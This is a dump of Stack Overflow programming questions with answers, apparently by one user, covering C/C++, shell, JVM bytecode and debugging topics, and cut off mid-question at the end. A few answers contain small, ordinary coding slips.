"<p>Suppose we have <em>n</em> elements, <em>a</em><sub>1</sub>, <em>a</em><sub>2</sub>, ..., <em>a</em><sub>n</sub>, arranged in a circle. That is, <em>a</em><sub>2</sub> is between <em>a</em><sub>1</sub> and <em>a</em><sub>3</sub>, <em>a</em><sub>3</sub> is between <em>a</em><sub>2</sub> and <em>a</em><sub>4</sub>, <em>a</em><sub><em>n</em></sub> is between <em>a</em><sub><em>n</em>-1</sub> and <em>a</em><sub>1</sub>, and so forth.</p>

<p>Each element can take the value of either 1 or 0. Two arrangements are different if there are corresponding <em>a</em><sub><em>i</em></sub>'s whose values differ. For instance, when <em>n</em>=3, (1, 0, 0) and (0, 1, 0) are different arrangements, even though they may be isomorphic under rotation or reflection.</p>

<p>Because there are <em>n</em> elements, each of which can take two values, the total number of arrangements is 2<sup><em>n</em></sup>.</p>

<p><strong>Here is the question:</strong></p>

<p>How many arrangements are possible, such that no two adjacent elements both have the value 1? If it helps, only consider cases where <em>n</em>>3. </p>

<p>I ask here for several reasons:</p>

<ol>
<li>This arose while I was solving a programming problem</li>
<li>It sounds like the problem may benefit from Boolean logic/bit arithmetic</li>
<li>Maybe there is no closed solution.</li>
</ol>
","9530","Adam Rosenfield","<p>This problem is very similar to <a href=""http://en.wikipedia.org/wiki/Zeckendorf%27s_theorem"" rel=""nofollow"">Zeckendorf representations</a>.  I can't find an obvious way to apply Zeckendorf's Theorem, due to the circularity constraint, but the Fibonacci numbers are obviously very prevalent in this problem.</p>
"
"<p>I see this in a stack trace:</p>

<blockquote>
  <p>myorg.vignettemodules.customregistration.NewsCategoryVAPDAO.getEmailContentByID(I)Lmyorg/pushemail/model/EmailContent;</p>
</blockquote>

<p>What does the ""<code>(I)L</code>"" mean?</p>
","9530","Adam Rosenfield","<p>It's a form of <a href=""http://en.wikipedia.org/wiki/Name_mangling"">name mangling</a> used for disambiguating method overloads.  The method name is appended by a series of characters describing the parameters and return type: the parameters appear sequentially inside parentheses, and the return type follows the closing parenthesis.  The codes are as follows:</p>

<ul>
<li><code>Z</code>: <code>boolean</code></li>
<li><code>B</code>: <code>byte</code></li>
<li><code>C</code>: <code>char</code></li>
<li><code>S</code>: <code>short</code></li>
<li><code>I</code>: <code>int</code></li>
<li><code>J</code>: <code>long</code></li>
<li><code>F</code>: <code>float</code></li>
<li><code>D</code>: <code>double</code></li>
<li><code>L </code><em>fully-qualified-class-name</em> <code>;</code> : fully qualified class</li>
<li><code>[</code> <em>type</em> : array of <em>type</em></li>
<li><code>V</code>: <code>void</code></li>
</ul>

<p>So, in your case, the <code>(I)Lmyorg/pushemail/model/EmailContent;</code> means the method takes one argument of type <code>int</code> and returns an object of type <code>myorg.pushemail.model.EmailContent</code>.</p>
"
"<p>I can't find much information on const_cast.  The only info I could find (on Stack Overflow) is:</p>

<blockquote>
  <p>The const_cast&lt;>() is used to add/remove const(ness) (or volatile-ness) of a variable.</p>
</blockquote>

<p>This makes me nervous.  Could using a const_cast cause unexpected behavior?  If so, what?</p>

<p>Alternatively, when is it okay to use const_cast?</p>
","9530","Adam Rosenfield","<p><code>const_cast</code> is safe only if you're casting a variable that was originally non-<code>const</code>.  For example, if you have a function that takes a parameter of a <code>const char *</code>, and you pass in a modifiable <code>char *</code>, it's safe to <code>const_cast</code> that parameter back to a <code>char *</code> and modify it.  However, if the original variable was in fact <code>const</code>, then using <code>const_cast</code> will result in undefined behavior.</p>

<pre><code>void func(const char *param, size_t sz, bool modify)
{
    if(modify)
        strncpy(const_cast&lt;char *&gt;(param), sz, ""new string"");
    printf(""param: %s\n"", param);
}

...

char buffer[16];
const char *unmodifiable = ""string constant"";
func(buffer, sizeof(buffer), true);  // OK
func(unmodifiable, strlen(unmodifiable), false); // OK
func(unmodifiable, strlen(unmodifiable), true);  // UNDEFINED BEHAVIOR
</code></pre>
"
"<p>Is there a way to view the register contents in each stack frame in a crash dump?
The registers window seems to contain the registers when the exception occurred but it would be useful to be able to see their contents in each stack frame.</p>
","9530","Adam Rosenfield","<p>Depending on the calling convention, you can get some of the registers which are saved on the stack.  For example, in the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow"">cdecl calling convention</a>, all of the registers except for EAX, ECX, and EDX are required to be saved, either by the caller or the callee.  Those three registers are clobberable, so you generally won't be able to get their values from higher up in the call stack.  If a function doesn't use a register that must be saved, then it won't save it, but since it doesn't use it, that register has the same value in the next higher stack frame.</p>
"
"<p>Is there a nice place for learning the JVM bytecode instruction set. The specification perhaps and maybe some tutorials?</p>

<p>I ask because I would like to design a toy language and a compiler for it that generates JVM bytecode.</p>

<p>Thanks for your knowledge and perhaps googling. </p>
","9530","Adam Rosenfield","<p>A good reference for Java bytecode specification is the <a href=""http://docs.oracle.com/javase/specs/jvms/se5.0/html/VMSpecTOC.doc.html"">The Java Virtual Machine Specification</a>.  </p>

<p>See chapter 4, <a href=""http://docs.oracle.com/javase/specs/jvms/se5.0/html/ClassFile.doc.html"">The class file format</a> and Chapter 6, <a href=""http://docs.oracle.com/javase/specs/jvms/se5.0/html/Instructions.doc.html"">The Java Virtual Machine Instruction Set</a>.  </p>
"
"<p>I have two computers.  Both running WinXP SP2 (I don't really know ho similar they are beyond that).  I am running MS Visual C# 2008 express edition on both and that's what I'm currently using to program.</p>

<p>I made an application that loads in an XML file and displays the contents in a DataGridView.</p>

<p>The first line of my xml file is:</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
</code></pre>

<p>...and really... it's utf-8 (at least according to MS VS C# when I just open the file there).</p>

<p>I compile the code and run it on one computer, and the contents of my DataGridView appears normal.  No funny characters.  I compile the code and run it on the other computer (or just take the published version from computer #1 and install it on computer #2 - I tried this both ways) and in the datagridview, where there are line breaks/new lines in the xml file, I see funny square characters.</p>

<p>I'm a novice to encoding... so the only thing I really tried to troubleshoot was to use that same program to write the contents of my xml to a new xml file (but I'm actually writing it to a text file, with the xml tags in it) since the default writing to a text file seems to be utf-8.  Then I read this new file back in to my program.  I get the same results.</p>

<p>I don't know what else to do or how to troubleshoot this or what I might fundamentally be doing wrong in the first place.</p>

<p>-Adeena</p>
","9530","Adam Rosenfield","<p>This doesn't have to do with UTF-8 or character encodings - this problem has to do with <a href=""http://en.wikipedia.org/wiki/Line_ending"" rel=""nofollow"">line endings</a>.  In Windows, each line of a text file ends in the two characters carriage-return (CR) and newline (LF, for line feed), which are code points U+000D and U+000A respectively.  In ASCII and UTF-8, these are encoded as the two bytes <code>0D 0A</code>.  Most non-Windows systems, including Linux and Mac OS X, on the other hand, uses just a newline character to signal end-of-line, so it's not uncommon to see line ending problems when transferring text files between Windows and non-Windows systems.</p>

<p>However, since you're using just Windows on both systems, this is more of a mystery.  One application is correctly interpreting the CRLF combination as a newline, but the other application is confused by the CR.  Carriage returns are not printable characters, so it replaces the CR with a placeholder box, which is what you see; it then correctly interprets the line feed as the end-of-line.</p>
"
"<p>I have two computers.  Both running WinXP SP2 (I don't really know ho similar they are beyond that).  I am running MS Visual C# 2008 express edition on both and that's what I'm currently using to program.</p>

<p>I made an application that loads in an XML file and displays the contents in a DataGridView.</p>

<p>The first line of my xml file is:</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
</code></pre>

<p>...and really... it's utf-8 (at least according to MS VS C# when I just open the file there).</p>

<p>I compile the code and run it on one computer, and the contents of my DataGridView appears normal.  No funny characters.  I compile the code and run it on the other computer (or just take the published version from computer #1 and install it on computer #2 - I tried this both ways) and in the datagridview, where there are line breaks/new lines in the xml file, I see funny square characters.</p>

<p>I'm a novice to encoding... so the only thing I really tried to troubleshoot was to use that same program to write the contents of my xml to a new xml file (but I'm actually writing it to a text file, with the xml tags in it) since the default writing to a text file seems to be utf-8.  Then I read this new file back in to my program.  I get the same results.</p>

<p>I don't know what else to do or how to troubleshoot this or what I might fundamentally be doing wrong in the first place.</p>

<p>-Adeena</p>
","9530","Adam Rosenfield","<p>I'm not sure of the cause of your problem, but one solution would be to to just strip out the carriage returns from your strings.  For every string you add, just call <code>TrimEnd(null)</code> on it to remove trailing whitespace:</p>

<pre><code>newrow[""topic""] = att1.ToString().TrimEnd(null);
</code></pre>

<p>If your strings might end in other whitespace (i.e. spaces or tabs) and you want to keep those, then just pass an array containing only the carriage return character to <code>TrimEnd</code>:</p>

<pre><code>newrow[""topic"" = att1.ToString().TrimEnd(new Char[]{'\r'});
</code></pre>

<p>Disclaimer: I am not a C# programmer; the second statement may be syntactically incorrect</p>
"
"<p>Let's say I have 3 point clouds: first that has 3 points {x1,y1,z1}, {x2,y2,z2}, {x3,y3,z3} and second point cloud that has same points as {xx1, yy1, zz1}, {xx2,yy2,zz2}, {xx3,yy3,zz3}... I assume to align second point cloud to first I have to multiply second one's points by T[3x3matrix]. </p>

<p>1) So how do I find this transform matrix(T) ? I tried to do the equations by hand, but failed to solve them. Is there an solution somewhere, cause I'm pretty sure I'm not the first one to stumble into the problem.</p>

<p>2) I assume that matrix might include skewing and shearing. Is there a way to find matrix with only 7 degrees of freedom (3translation, 3rotation, 1scale)?</p>
","9530","Adam Rosenfield","<p>The transformation matrix T1 that takes the unit vectors {1, 0, 0}, {0, 1, 0}, and {0, 0, 1} to {x1, y1, z1}, {x2, y2, z2}, {x3, y3, z3} is simply</p>

<pre>
     | x1 x2 x3 |
T1 = | y1 y2 y3 |
     | z1 z2 z3 |</pre>

<p>And likewise the transformation T2 that takes those 3 unit vectors to the second set of points is</p>

<pre>
     | xx1 xx2 xx3 |
T2 = | yy1 yy1 yy3 |
     | zz1 zz2 zz3 |</pre>

<p>Therefore, the matrix that takes the first three points to the second three points is given by T2 * T1<sup>-1</sup>.  If T1 is non-singular, then this transformation is uniquely determined, so it has no degrees of freedom.  If T1 is a singular matrix, then there could be no solutions, or there could be infinitely many solutions.</p>

<p>When you say you want 7 degrees of freedom, this is somewhat of a misuse of terminology.  In the general case, this matrix is composed of 3 rotational degrees of freedom, 3 scaling degrees, and 3 shearing degrees, making a total of 9.  You can figure out these parameters by performing a <a href=""http://en.wikipedia.org/wiki/QR_factorization"" rel=""nofollow"">QR factorization</a>.  The Q matrix gives you the rotational parameters, and the R matrix gives you the scaling parameters (along the diagonal) and the shearing parameters (above the diagonal).</p>
"
"<p>While debugging a Linux app, I found a pointer with the suspicious value 0x7c7c7c7c.  Does that particular value indicate anything?</p>

<p>(I ask because I know from my MSVC days that in a debug build, values like 0xcdcdcdcd or 0xdddddddd would be stored into heap blocks that were uninitialized, freed, or otherwise invalid.  Some people use magic values like 0xdeadbeef or 0xcafebabe in uninitialized memory.  I'm guessing something in libc or elsewhere uses 0x7c7c7c7c as a magic value, but I can't find it documented.)</p>
","9530","Adam Rosenfield","<p>I don't recognize that magic number, and neither does <a href=""http://en.wikipedia.org/wiki/Magic_number_(programming)"" rel=""nofollow"">Wikipedia</a>.  I would guess that some code in your program (or in a library you're using) is using <code>memset()</code> and hitting your pointer.  Have you grepped your code base case-insensitively for the string ""0x7c""?</p>
"
"<p>How to change RGB color to HSV? In C# language.
I search for very fast method without any external library.</p>
","9530","Adam Rosenfield","<p>See <a href=""http://en.wikipedia.org/wiki/HSV_color_space#Conversion_from_RGB_to_HSL_or_HSV"" rel=""nofollow"">Wikipedia</a>.  It should be relatively straightforward to convert those formulas into code.  Just be careful about the ranges of your inputs and outputs: are they floats between 0 and 1, integers between 0 and 255, or something else?</p>
"
"<p>Can anyone recommend a decent SFTP library for use with Windows C++ apps?  If a cross-platform one is available then all the better, but it's not essential.  It's for use with a commercial application, so paying for something isn't an issue.</p>

<p>I am using the superb <a href=""http://www.codeproject.com/KB/MFC/UltimateTCPIP.aspx"">Ultimate TCP/IP</a> library which supports FTP-S but not SFTP (yeh, I know, confusing isn't it!).</p>

<p>I've come across the <a href=""http://www.chilkatsoft.com/ssh-sftp-c++.asp"">Chilkat</a> library, which looks very good, but wondered if there are any others that people have used.</p>
","9530","Adam Rosenfield","<p><a href=""http://www.openssh.com/"" rel=""nofollow"">OpenSSH</a> would be a good option.  It's cross-platform and comes with a BSD license, so you can use it in your commercial application without having to disclose your source code.</p>
"
"<p>What is a good way to represent sparse set of integers (really C memory addresses) in a compact and fast way. I already know about the obvious things like bit-vectors and run-length encoding. but I want something much more compact than one word per set element. I need to add and remove elements and test for membership. I do not need other set operations, like union.</p>

<p>I read about one such library many years ago but have since forgotten its name. I think it was released as open source by HP and had a womans name.</p>
","9530","Adam Rosenfield","<p>If all you need is insertion, deletion, and test for membership, then a hash table should suit you nicely.  You can find some good hash functions for hashing 32-bit integers <a href=""http://burtleburtle.net/bob/c/lookup3.c"" rel=""nofollow"">here</a>.</p>
"
"<p>I would like to know if it is possible to copy/move files to a destination based on the origin name.</p>

<p>Basically, I have a /mail folder, which has several subfolders such as cur and new etc. I then have an extracted backup in /mail/home/username that is a duplicate. mv -f will not work, as I do not have permission to overwrite the directories, but only the files within.</p>

<p>I get errors such as mv: cannot overwrite directory `/home/username/mail/username.com'</p>

<p>What I want to do is for each file in the directory username.com, move it to the folder of the same name in /mail. There could be any number of folders in place of username.com, with seperate sub sirectories of their own.</p>

<p>What is the best way to do this?</p>

<p>I have to do it this way as due to circumstances I only have access to my host with ftp and bash via php.</p>

<p>edit: clarification</p>

<p>I think I need to clarify what happened. I am on a shared host, and apparently do not have write access to the directories themselves. At least the main ones such as mail and public_html. I made a backup of ~/mail with tar, but when trying to extract it extracted to ~/mail/home/mail etc, as I forgot about the full path. Now, I cannot simply untar because the path is wrong, and I cannot mv -f because I only have write access to files, not directories.</p>
","9530","Adam Rosenfield","<p>I'm not entirely clear on what it is that you want to do, but you could try the following:</p>

<pre><code>for file in /mail/*; do
    mv -f $file /home/username/mail/$(basename $file)
done
</code></pre>

<p>This will move every file and subdirectory in /mail from there into /home/username/mail.</p>
"
"<p>This is driving me nuts.  I am using some 3rd-party code in a Windows .lib that, in debug mode, is causing an error similar to the following:</p>

<pre><code>Run-Time Check Failure #2 - Stack around the variable 'foo' was corrupted.
</code></pre>

<p>The error is thrown when either the object goes out of scope or is deleted.  Simply allocating one of these objects and then deleting it will throw the error.  I therefore think the problem is either in one of the many constructors/destructors but despite stepping through every line of code I cannot find the problem.</p>

<p>However, this only happens when creating one of these objects in a static library.  If I create one in my EXE application, the error does not appear.  The 3rd-party code itself lives in a static lib.  For example, this fails:</p>

<pre><code>**3RDPARTY.LIB**

class Foo : public Base
{
    ...
};

**MY.LIB**

void Test()
{
    Foo* foo = new Foo;
    delete foo; // CRASH!
}

**MY.EXE**

void Func()
{
    Test();
}
</code></pre>

<p>But this will work:</p>

<pre><code>**3RDPARTY.LIB**

class Foo : public Base
{
    ...
};

**MY.EXE**

void Func()
{
    Foo* foo = new Foo;
    delete foo; // NO ERROR
}
</code></pre>

<p>So, cutting out the 'middle' .lib file makes the problem go away and it is this weridness that is driving me mad.  The EXE and 2 libs all use the same CRT library.  There are no errors linking.  The 3rd-party code uses inheritance and there are 5 base classes.  I've commented out as much code as I can whilst still getting it to build and I just can't see what's up.</p>

<p>So if anyone knows why code in a .lib would act differently to the same code in a .exe, I would love to hear it.  Ditto any tips for tracking down memory overwrites!  I am using Visual Studio 2008.</p>
","9530","Adam Rosenfield","<p>One possibility is that it's a <a href=""http://en.wikipedia.org/wiki/Calling_convention"" rel=""nofollow"">calling convention</a> mismatch - make sure that your libraries and executables are all set to use the same default calling convention (usually __cdecl).  To set that, open up your project properties and go to <strong>Configuration Properties > C/C++ > Advanced</strong> and look at the <strong>Calling Convention</strong> option.  If you call a function with the wrong calling convention, you'll completely mess up the stack.</p>
"
"<p>I'm trying to use grep with -v for invert-match along with -e for regular expression.  I'm having trouble getting the syntax right. </p>

<p>I'm trying something like</p>

<pre><code>tail -f logFile | grep -ve ""string one|string two""
</code></pre>

<p>If I do it this way it doesn't filter
If I change it to</p>

<pre><code>tail -f logFile | grep -ev ""string one|string two""
</code></pre>

<p>I get </p>

<pre><code>grep: string one|string two: No such file or directory
</code></pre>

<p>I have tried using () or quotes, but haven't been able to find anything that works.</p>

<p>How can I do this?</p>
","9530","Adam Rosenfield","<p>The problem is that by default, you need to escape your |'s to get proper alternation.  That is, grep interprets ""foo|bar"" as matching the literal string ""foo|bar"" only, whereas the pattern ""foo\|bar"" (with an escaped |) matches either ""foo"" or ""bar"".</p>

<p>To change this behavior, use the -E flag:</p>

<pre><code>tail -f logFile | grep -vE 'string one|string two'
</code></pre>

<p>Alternatively, use egrep, which is equivalent to grep -E:</p>

<pre><code>tail -f logFile | egrep -v 'string one|string two'
</code></pre>

<p>Also, the -e is optional, unless your pattern begins with a literal hyphen.  grep automatically takes the first non-option argument as the pattern.</p>
"
"<p>I'm building a game and I was compiling seeing what sort of errors were coming up and there is one there is very common and very puzzling to me:</p>

<pre><code>1&gt;c:\users\owner\desktop\bosconian\code\bosconian\ship.h(9) : error C2460: 'Ship::Coordinate' : uses 'Ship', which is being defined
</code></pre>

<p>This also comes up for the SpaceObject class and all other derivations of it. The Coordinate class is simply just a 2d vector class and, if it matters, references nothing but an Environment class.</p>

<p>The Environment class references the SpaceObject's but I don't believe that's a problem (correct me if I'm wrong)</p>

<p>This is my first larger scale project in C++ and I was wondering if this might be a common newbie error with a more obvious solution. If it matters the SpaceObject class hierarchy is not all the way filled in, but it is filled in several levels past the SpaceObject and Ship classes.
.<br />
.<br />
.<br />
Edit: This is in response to the comment. </p>

<p>-When I say reference I mean refer to that class in another class. Like in the SpaceObject class I reference the Coordinate class:<br />
    Coordinate * position</p>

<p>Environment does make reference to SpaceObject pointers, but I can't see I could not reference classes like that...I mean, all my classes have to relate to eachother in some way, right?</p>

<p>In response to pasting code, it's sort of hard because they are huge classes but here is the line the error is pointing to:</p>

<pre><code>public:
Ship(Coordinate * positionObject_, int direction_, int possibleDirections_, int maxHealth_, Component * objectSectors_, int numOfObjectSectors_, double speed_);//this is the line
void move();//handles the actual translation of calculated move on the map (i.e. bounds checking)
</code></pre>
","9530","Adam Rosenfield","<p>You've got something like this:</p>

<pre><code>class Ship
{
    class Coordinate
    {
        Ship m_ship;
    };

    Coordinate m_coordinate;
};
</code></pre>

<p>The problem is that each Ship object contains as a member a Coordinate, which contains as a member a Ship, ad nauseum.  The size of a Ship would become infinitely large if this were allowed to continue.  What you really want is to replace those member variables with pointers or references - a pointer/reference has a known size (e.g. 4 bytes on a 32-bit CPU), and can be declared without knowing any information about the type being pointed/referred to.</p>
"
"<p>I am compiling a c++ static library in vs2008, and in the solution i also have a startup project that uses the lib, and that works fine. </p>

<p>But when using the lib in another solution i get an run-time check failure.
""The value of ESP was not properly saved across a functioncall""
Stepping through the code i noticed a function foo() jumping to bar() instead right before the crash. The functions in question are just regular functions and no function pointers.</p>

<p>Anyone has any clue what might be going on, and why it works when using the lib's from the same solution?</p>

<p>edit: the functions (methods) are part of a class, if that helps.</p>
","9530","Adam Rosenfield","<p>Make sure you're compiling in Debug mode and not Release mode.  If you attempt to debug a program in Release mode, the data you get back from the debugger will be garbage due to optimizations.</p>
"
"<p>Love to hear your opinions and justification?</p>

<p>I've heard deep directories are bad, but how does it compare to underscore characters?</p>
","9530","Adam Rosenfield","<p>Use dashes - Google regards dashes as separating words, but underscores are considered part of the word.  See <a href=""http://www.codinghorror.com/blog/archives/000574.html"" rel=""nofollow"">http://www.codinghorror.com/blog/archives/000574.html</a>.</p>
"
"<p>Are C-style macro names subject to the same naming rules as identifiers?  After a compiler upgrade, it is now emitting this warning for a legacy application:</p>

<pre><code>warning #3649-D: white space is required between the macro name ""CHAR_"" and its replacement text
  #define         CHAR_&amp;        38
</code></pre>

<p>This line of code is defining an ASCII value constant for an ampersand.</p>

<pre><code>#define   DOL_SN        36
#define   PERCENT       37
#define   CHAR_&amp;        38
#define   RT_SING       39
#define   LF_PAR        40
</code></pre>

<p>I assume that this definition (not actually referenced by any code, as far as I can tell) is buggy and should be changed to something like ""CHAR_AMPERSAND""?</p>
","9530","Adam Rosenfield","<p>Macro names should only consist of alphanumeric characters and underscores, i.e. <code>'a-z'</code>, <code>'A-Z'</code>, <code>'0-9'</code>, and <code>'_'</code>, and the first character should not be a digit.  Some preprocessors also permit the dollar sign character <code>'$'</code>, but you shouldn't use it; unfortunately I can't quote the C standard since I don't have a copy of it.</p>

<p>From the <a href=""http://gcc.gnu.org/onlinedocs/cpp/Tokenization.html#Tokenization"">GCC documentation</a>:</p>

<blockquote>
  <p>Preprocessing tokens fall into five
  broad classes: identifiers,
  preprocessing numbers, string
  literals, punctuators, and other. An
  <em>identifier</em> is the same as an
  identifier in C: any sequence of
  letters, digits, or underscores, which
  begins with a letter or underscore.
  Keywords of C have no significance to
  the preprocessor; they are ordinary
  identifiers. You can define a macro
  whose name is a keyword, for instance.
  The only identifier which can be
  considered a preprocessing keyword is
  <code>defined</code>. See Defined.</p>
  
  <p>This is mostly true of other languages
  which use the C preprocessor. However,
  a few of the keywords of C++ are
  significant even in the preprocessor.
  See C++ Named Operators.</p>
  
  <p>In the 1999 C standard, identifiers
  may contain letters which are not part
  of the “basic source character set”,
  at the implementation's discretion
  (such as accented Latin letters, Greek
  letters, or Chinese ideograms). This
  may be done with an extended character
  set, or the <code>'\u'</code> and <code>'\U'</code> escape
  sequences. The implementation of this
  feature in GCC is experimental; such
  characters are only accepted in the
  <code>'\u'</code> and <code>'\U'</code> forms and only if
  <code>-fextended-identifiers</code> is used.</p>
  
  <p>As an extension, GCC treats <code>'$'</code> as a
  letter. This is for compatibility with
  some systems, such as VMS, where <code>'$'</code>
  is commonly used in system-defined
  function and object names. <code>'$'</code> is not
  a letter in strictly conforming mode,
  or if you specify the <code>-$</code> option. See
  Invocation.</p>
</blockquote>
"
"<p>I have a shell script with this code:</p>

<pre><code>var=`hg st -R ""$path""`
if [ -n ""$var"" ]; then
    echo $var
fi
</code></pre>

<p>But the conditional code always executes because <code>hg st</code> always prints at least one newline character.</p>

<ul>
<li>Is there a simple way to strip whitespace from <code>$var</code> (like <code>trim()</code> in php)?</li>
</ul>

<p>or</p>

<ul>
<li>Is there a standard way of dealing with this issue?</li>
</ul>

<p>I could use <code>sed</code> or <code>awk</code>, but I'd like to think there is a more elegant solution to this problem.</p>
","9530","Adam Rosenfield","<p>You can delete newlines with <code>tr</code>:</p>

<pre><code>var=`hg st -R ""$path"" | tr -d '\n'`
if [ -n $var ]; then
    echo $var
done
</code></pre>
"
"<p>If you have a binary file format (or packet format) which is described as a C structure, are there any programs which will parse the structure and turn it into neat documentation on your protocol?</p>

<p>The struct would of course contain arrays, other structures, etc., as necessary to describe the format.  The documentation would probably need to include things like packing, endianness, etc.</p>
","9530","Adam Rosenfield","<p><a href=""http://www.stack.nl/~dimitri/doxygen/"" rel=""nofollow"">Doxygen</a> is a commonly-used <strong>doc</strong>umentation <strong>gen</strong>erator.  However, if you want to get useful documentation, you'll probably have to mark up your structure definitions with doc comments.</p>
"
"<p>I know that the OS will sometimes initialise memory with certain patterns such as 0xCD and 0xDD.  What I want to know is <strong>when</strong> and <strong>why</strong> this happens.</p>

<p><H2>When</H2></p>

<p>Is this specific to the compiler used?</p>

<p>Do malloc/new and free/delete work in the same way with regard to this?</p>

<p>Is it platform specific?</p>

<p>Will it occur on other operating systems, such as Linux or VxWorks?</p>

<p><H2>Why</H2></p>

<p>My understanding is this only occurs in Win32 debug configuration, and it is used to detect memory overruns and to help the compiler catch exceptions.</p>

<p>Can you give any practical examples as to how this initialisation is useful?</p>

<p>I remember reading something (maybe in Code Complete 2) that it is good to initialise memory to a known pattern when allocating it, and certain patterns will trigger interrupts in Win32 which will result in exceptions showing in the debugger.</p>

<p>How portable is this?</p>
","9530","Adam Rosenfield","<p>One nice property about the fill value 0xCCCCCCCC is that in x86 assembly, the opcode 0xCC is the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/INT.htm"" rel=""nofollow"">int3</a> opcode, which is the software breakpoint interrupt. So, if you ever try to execute code in uninitialized memory that's been filled with that fill value, you'll immediately hit a breakpoint, and the operating system will let you attach a debugger (or kill the process).</p>
"
"<p>I noticed C++ will not compile the following:</p>

<pre><code>class No_Good {
  static double const d = 1.0;
};
</code></pre>

<p>However it will happily allow a variation where the double is changed to an int, unsigned, or any integral type:</p>

<pre><code>class Happy_Times {
  static unsigned const u = 1;
};
</code></pre>

<p>My solution was to alter it to read:</p>

<pre><code>class Now_Good {
  static double d() { return 1.0; }
};
</code></pre>

<p>and figure that the compiler will be smart enough to inline where necessary... but it left me curious.</p>

<p>Why would the C++ designer(s) allow me to static const an int or unsigned, but not a double?</p>

<p>Edit: I am using visual studio 7.1 (.net 2003) on Windows XP.</p>

<p>Edit2:</p>

<p>Question has been answered, but for completion, the error I was seeing:</p>

<pre><code>error C2864: 'd' : only const static integral data members can be initialized inside a class or struct
</code></pre>
","9530","Adam Rosenfield","<p>The problem is that with an integer, the compiler <em>usually</em> doesn't have to ever create a memory address for the constant.  It doesn't exist at runtime, and every use of it gets inlined into the surrounding code.  It can still decide to give it a memory location - if its address is ever taken (or if it's passed by const reference to a function), that it must.  In order to give it an address, it needs to be defined in some translation unit.  And in that case, you need to separate the declaration from the definition, since otherwise it would get defined in multiple translation units.</p>

<p>Using g++ with no optimization (<code>-O0</code>), it automatically inlines constant integer variables but not constant double values.  At higher optimization levels (e.g. <code>-O1</code>), it inlines constant doubles.  Thus, the following code compiles at <code>-O1</code> but NOT at <code>-O0</code>:</p>

<pre><code>// File a.h
class X
{
 public:
  static const double d = 1.0;
};

void foo(void);

// File a.cc
#include &lt;stdio.h&gt;

#include ""a.h""

int main(void)
{
  foo();
  printf(""%g\n"", X::d);

  return 0;
}

// File b.cc
#include &lt;stdio.h&gt;

#include ""a.h""

void foo(void)
{
  printf(""foo: %g\n"", X::d);
}
</code></pre>

<p>Command line:</p>

<pre><code>g++ a.cc b.cc -O0 -o a   # Linker error: ld: undefined symbols: X::d
g++ a.cc b.cc -O1 -o a   # Succeeds
</code></pre>

<p>For maximal portability, you should declare your constants in header files and define them once in some source file.  With no optimization, this will not hurt performance, since you're not optimizing anyways, but with optimizations enabled, this can hurt performance, since the compiler can no longer inline those constants into other source files, unless you enable ""whole program optimization"".</p>
"
"<p>In C++ I'm generating a PDF report with <a href=""http://libharu.org"" rel=""nofollow"">libHaru</a>. I'm looking for someway to append two pages from an existing PDF file to the end of my report. Is there any free way to do that?</p>

<p>Thanks.</p>
","9530","Adam Rosenfield","<p>You can use the <a href=""http://www.ghostscript.com/"" rel=""nofollow"">Ghostscript</a> utility <code>pdf2ps</code> to convert the PDF files to PostScript, append the PostScript files, and then convert them back to a PDF using <code>ps2pdf</code>.</p>
"
"<p>I have a static library *.lib created using MSVC on windows. The size of library is say 70KB. Then I have an application which links this library. But now the size of the final executable (*.exe) is 29KB, less than the library. What i want to know is :</p>

<ol>
<li><p>Since the library is statically linked, I was thinking it should add directly to the executable size and the final exe size should be more than that?  Does windows exe format also do some compression of the binary data? </p></li>
<li><p>How is it for linux systems, that is how do sizes of library on linux (*.a/*.la file) relate with size of linux executable (*.out) ? </p></li>
</ol>

<p>-AD</p>
","9530","Adam Rosenfield","<p>The static library probably contains several functions which are never used.  When the linker links the library with the main executable, it sees that certain functions are never used (and that their addresses are never taken and stored in function pointers), it just throws away the code.  It can also do this recursively: if function A() is never called, and A() calls B(), but B() is never otherwise called, it can remove the code for both A() and B().  On Linux, the same thing happens.</p>
"
"<p>GCC 3.4.5 (MinGW version) produces a warning: parameter has incomplete type for line 2 of the following C code:</p>

<pre><code>struct s;
typedef void (* func_t)(struct s _this);
struct s { func_t method; int dummy_member; };
</code></pre>

<p>Is there a way to fix this (or at least hide the warning) without changing the method argument's signature to (struct s *)?</p>

<p><strong>Note:</strong> As to why something like this would be useful: I'm currently tinkering with an object-oriented framework; 'method' is an entry in a dispatch table and because of the particular design of the framework, it makes sense to pass '_this' by value and not by reference (as it is usually done)...</p>
","9530","Adam Rosenfield","<p>You can't quite do this easily - according to the <a href=""http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1256.pdf"" rel=""nofollow"">C99 standard</a>, Section 6.7.5.3, paragraph 4:</p>

<blockquote>
  <p>After adjustment, the parameters in a parameter type list in a function declarator that is
  part of a definition of that function shall not have incomplete type.</p>
</blockquote>

<p>Your options are, therefore, to have the function take a pointer to the structure, or to take a pointer to a function of a slightly different type, such as a function taking unspecified parameters:</p>

<pre><code>typedef void (* func_t)(struct s*);  // Pointer to struct
typedef void (* func_t)(void *);     // Eww - this is inferior to above option in every way
typedef void (* func_t)();           // Unspecified parameters
</code></pre>
"
"<p>At work today we were trying to come up with any reason you would use <a href=""http://www.php.net/strspn"">strspn</a>.</p>

<p>I searched google code to see if it's ever been implemented in a useful way and came up blank. I just can't imagine a situation in which I would really need to know the length of the first segment of a string that contains only characters from another string. Any ideas?</p>
","9530","Adam Rosenfield","<p>It's based on the the ANSI C function <code>strspn()</code>.  It can be useful in low-level C parsing code, where there is no high-level string class.  It's considerably less useful in PHP, which has lots of useful string parsing functions.</p>
"
"<p>I'm creating a simple API that creates typed classes based on JSON data that has a mandatory 'type' field defined in it.  It uses this string to define a new type, add the fields in the JSON object, instantiate it, and then populate the fields on the instance.</p>

<p>What I want to be able to do is allow for these types to be optionally pre-defined in whatever application is using my module.  This is so methods and other application-specific attributes not found in the JSON object can be added.  I'd like to have my module check if a type already exists, and if it does, use that instead of dynamically creating the type.  It would still add attributes from the JSON object, but it would be recycling the existing type.</p>

<p>My JSON data is:</p>

<pre><code>{
    ""type"": ""Person"",
    ""firstName"": ""John"",
    ""lastName"": ""Smith"",
    ""address"": {
    	""streetAddress"": ""21 2nd Street"",
    	""city"": ""New York"",
    	""state"": ""NY"",
    	""postalCode"": 10021
    },
    ""phoneNumbers"": [
    	""212 555-1234"",
    	""646 555-4567""
    ]
